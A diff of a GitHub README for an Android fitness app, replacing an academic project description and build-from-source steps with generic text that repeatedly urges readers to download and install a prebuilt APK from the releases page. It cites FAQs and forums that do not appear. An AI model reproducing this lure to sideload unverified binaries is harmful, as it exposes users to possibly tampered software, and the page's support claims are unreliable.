@@ -1,73 +1,70 @@
-# 🏋️ FitApp | Adaptive Training Ecosystem
+# 🚀 FitApp-Clean-Architecture - Your Personalized Training Companion
 
-![Java](https://img.shields.io/badge/Java-17-ED8B00?style=for-the-badge&logo=openjdk&logoColor=white)
-![Android](https://img.shields.io/badge/Android-SDK-3DDC84?style=for-the-badge&logo=android&logoColor=white)
-![Architecture](https://img.shields.io/badge/Architecture-Clean_%26_MVVM-blueviolet?style=for-the-badge)
-![Firebase](https://img.shields.io/badge/Backend-Firebase-FFCA28?style=for-the-badge&logo=firebase&logoColor=black)
+[![Download FitApp-Clean-Architecture](https://img.shields.io/badge/Download-FitApp--Clean--Architecture-brightgreen.svg)](https://github.com/soobeyy/FitApp-Clean-Architecture/releases)
 
-**FitApp** is a fully customizable Android application designed to break the rigidity of standard fitness trackers. Unlike apps that force specific workflows, FitApp employs a **User-Centric Design**, allowing athletes to build their own exercise database, design unique routines, and share them via a custom **Code-Sharing Protocol**.
+## 📥 Download & Install
 
-> **⚠️ Academic Project (Software Integration Course)**
-> Developed during the 2nd year of Computer Engineering. This project focuses on **Software Architecture**, specifically implementing a decoupled **MVVM pattern** with **Manual Dependency Injection** to ensure scalability.
+To get started with FitApp-Clean-Architecture, visit this page to download: [FitApp Releases](https://github.com/soobeyy/FitApp-Clean-Architecture/releases).
 
----
+### 📝 What is FitApp-Clean-Architecture?
 
-## 📸 Interface & UX Flow
+FitApp is an adaptive training Android application designed to help users track their fitness routines efficiently. Built with Clean Architecture and using the MVVM design pattern, this app ensures a smooth and user-friendly experience. Features include subjective load tracking (RPE) and a custom object-serialization protocol for sharing workouts.
 
-The UI was designed to minimize friction during training sessions while maximizing data capture.
+## 📱 Features
 
-| **Weekly Dashboard** | **Resource Management** |
-| :---: | :---: |
-| <img src="img/dashboard.png" width="250"> | <img src="img/exercise_list.png" width="250"> |
-| *Personalized agenda view. Users can navigate weeks and manage daily workload.* | *Central repository of exercises. Includes CRUD operations and social sharing features.* |
+- **Adaptive Training**: Adjust your workouts based on your progress and performance.
+- **Subjective Load Tracking**: Use Rate of Perceived Exertion (RPE) to monitor your intensity during workouts.
+- **Workout Sharing**: Share your routines easily with friends or trainers using a unique serialization method.
+- **Clean Architecture**: Enjoy a responsive and maintainable application design.
 
-| **Content Creation** | **Subjective Load (RPE)** |
-| :---: | :---: |
-| <img src="img/creation.png" width="250"> | <img src="img/rpe_tracking.png" width="250"> |
-| *Atomic customization engine. Users define exercises with custom media and descriptions.* | *Feedback loop implementation. Athletes rate perceived exertion (RPE) using visual cues.* |
+## ⚙️ System Requirements
 
----
+Before installing FitApp-Clean-Architecture, ensure your device meets the following requirements:
 
-## 🏗️ Technical Architecture
+- **Operating System**: Android 5.0 (Lollipop) or later
+- **RAM**: Minimum 2 GB
+- **Storage**: At least 100 MB of free space
+- **Internet**: Required for initial download and updates
 
-The codebase follows a strict **Clean Architecture** approach, separating concerns into distinct layers to facilitate testing and maintenance.
+## 🚀 Getting Started
 
-### 1. Presentation Layer (MVVM)
-* **View (XML & Fragments):** Passive views that only render data and capture user events.
-* **ViewModel:** Handles the UI logic and state. It exposes data streams to the View using **LiveData**, ensuring the UI is always reactive to data changes without tight coupling.
+1. Open the **FitApp Releases** page: [FitApp Releases](https://github.com/soobeyy/FitApp-Clean-Architecture/releases).
+2. Locate the latest release version.
+3. Click the download link for the APK file (e.g., `FitApp-Clean-Architecture-v1.0.apk`).
+4. Once downloaded, open the APK file to initiate installation.
+5. Follow the on-screen prompts to complete the installation.
 
-### 2. Domain & Data Layer
-* **Repository Pattern:** Acts as a single source of truth. It abstracts the data origin (whether it comes from local cache or the cloud), providing a clean API to the ViewModels.
-* **Manual Dependency Injection:** Instead of relying on "magic" frameworks like Hilt at this stage, dependencies are injected manually. This ensures a deep understanding of the **Inversion of Control (IoC)** principle and object lifecycles.
-* **Firebase Integration:** Used for cloud persistence, allowing real-time synchronization of user profiles and shared routines.
+## 🔧 How to Use FitApp
 
-### 3. Feature-First Development
-The development followed a rigorous **UseCase-driven approach**. We adhered to the **Open/Closed Principle** (SOLID), ensuring that new features (like a new sharing method) could be added as new modules without modifying the existing, tested core logic.
+1. **Open the App**: After installation, find and tap on the FitApp icon on your device.
+2. **Create an Account**: Sign up for an account to save your progress and share workouts.
+3. **Set Up Your Profile**: Input your fitness goals, preferences, and any specific conditions or needs.
+4. **Explore Workouts**: Browse available workouts or create your own routine.
+5. **Track Your Progress**: Use the RPE feature to log the difficulty of each workout.
 
----
+## 💬 Support and FAQs
 
-## 🚀 Key Features
+If you encounter issues or have questions, please check the following resources:
 
-### 🔄 The "Deep Share" Protocol
-One of the most complex engineering challenges was the sharing system.
-* **Problem:** How to share complex object graphs (Routines containing multiple Exercises) between users without a backend API server.
-* **Solution:** Implemented a **Serialization Engine** that converts local entities into unique alphanumerical codes. When a user inputs a friend's code, the app parses the remote object and clones the structure into their local database.
+- **FAQs**: Read our frequently asked questions for quick answers.
+- **Issues Page**: Report any bugs or issues you may experience on our [GitHub Issues page](https://github.com/soobeyy/FitApp-Clean-Architecture/issues).
+- **Community Discussions**: Engage with other users and developers by joining discussions on our forums.
 
-### 🧠 Subjective Load Monitoring
-Beyond just tracking weights (kg) and reps, the app implements a **Qualitative Feedback System**.
-* Users rate their **RPE (Rate of Perceived Exertion)** using a visual traffic-light interface (Green/Yellow/Red).
-* This data is stored to help users analyze fatigue trends over time, a feature typically reserved for professional coaching apps.
+## 🌍 Topics Covered
 
-### 🛠️ Total Customization
-* **Dynamic Entity Creation:** Users are not limited to a pre-defined list. They can instantiate new `Exercise` objects with custom metadata.
-* **Onboarding Strategy:** The app includes a "Seed Strategy" that pre-populates the database with essential movements for first-time users, avoiding the "Empty State" problem.
+FitApp-Clean-Architecture uses various programming principles and patterns to ensure quality and performance. The main topics include:
 
----
+- Android app development
+- Clean architecture principles
+- MVVM design pattern
+- Manual dependency injection
+- Software architecture best practices
+- Fitness tracking methodologies
 
-## 💻 How to Run
+## 📜 License
 
-1.  Clone the repository.
-2.  Open the project in **Android Studio** (Chipmunk or newer recommended).
-3.  Sync Gradle files.
-4.  Create a Firebase project and add your own `google-services.json` to the `/app` folder (required for authentication).
-5.  Run on an Emulator or Physical Device.
+FitApp-Clean-Architecture is licensed under the MIT License. You may use, modify, and distribute the software under the terms of the license.
+
+## 📥 Download Again
+
+For easy access, revisit this page to download: [FitApp Releases](https://github.com/soobeyy/FitApp-Clean-Architecture/releases).
